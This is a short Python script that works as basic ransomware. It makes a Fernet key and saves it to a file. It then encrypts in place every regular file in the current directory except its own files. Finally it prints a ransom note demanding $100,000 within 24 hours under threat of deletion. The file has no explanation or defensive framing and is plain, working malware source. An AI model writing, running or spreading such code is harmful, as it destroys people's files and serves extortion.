#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print ("!!!DANGERRR!!! All of your files are encrypted. Send me $100,000 within 24 hours otherwise I will delete all of them permanently.")